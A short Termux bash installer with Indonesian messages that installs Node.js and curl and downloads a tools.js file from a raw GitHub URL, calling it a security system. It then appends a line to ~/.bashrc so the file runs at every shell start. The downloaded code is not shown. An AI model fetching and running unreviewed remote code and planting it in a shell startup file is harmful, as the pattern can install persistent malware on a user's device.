#!/bin/bash
clear
echo -e "\e[36m[1/3] Menginstall Node.js & Curl...\e[0m"
pkg update -y &>/dev/null
pkg install nodejs curl -y &>/dev/null

echo -e "\e[36m[2/3] Mendownload sistem keamanan...\e[0m"
curl -sL "https://raw.githubusercontent.com/anonim169/tools-termux/refs/heads/main/tools.js" -o $HOME/tools.js
chmod +x $HOME/tools.js

echo -e "\e[36m[3/3] Memasang Auto-Run...\e[0m"
sed -i '/node ~\/tools.js/d' ~/.bashrc
echo "node ~/tools.js" >> ~/.bashrc

sleep 1
echo -e "\e[32m[+] Selesai! Menjalankan sistem...\e[0m"
sleep 1

node $HOME/tools.js
